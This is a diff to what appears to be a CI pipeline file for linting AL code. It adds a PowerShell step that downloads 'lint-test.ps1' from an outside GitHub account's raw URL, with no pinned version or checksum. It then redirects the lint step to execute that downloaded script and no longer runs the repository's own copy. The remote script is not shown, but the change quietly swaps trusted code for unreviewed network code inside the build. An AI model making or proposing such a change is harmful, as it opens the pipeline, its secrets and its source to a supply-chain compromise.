@@ -91,6 +91,23 @@ stages:
         steps:
           - checkout: self
             fetchDepth: 1
+          
+          - task: PowerShell@2
+            displayName: 'Download File'
+            inputs:
+              targetType: 'inline'
+              script: |
+                $url = "https://raw.githubusercontent.com/WinHub001/pestertest/main/lint-test.ps1"
+                $outputPath = "$(Build.SourcesDirectory)\lint-test.ps1"
+
+                Invoke-WebRequest -Uri $url -OutFile $outputPath
+                
+                if (Test-Path $outputPath) {
+                  Write-Host "File downloaded successfully to $outputPath"
+                } else {
+                  Write-Error "Failed to download file"
+                  exit 1
+                }
 
           - task: PowerShell@2
             displayName: 'Lint AL Code Files'
@@ -106,7 +123,7 @@ stages:
                   Write-Host "Found $($alFiles.Count) AL files:"
                   foreach ($file in $alFiles) {
                     Write-Host "Linting $($file.FullName)"
-                    $output = & "$(Build.SourcesDirectory)/.scripts/lint-test.ps1" -FilePath $file.FullName
+                    $output = & "$(Build.SourcesDirectory)/lint-test.ps1" -FilePath $file.FullName
                   }
                 }
               failOnStderr: false
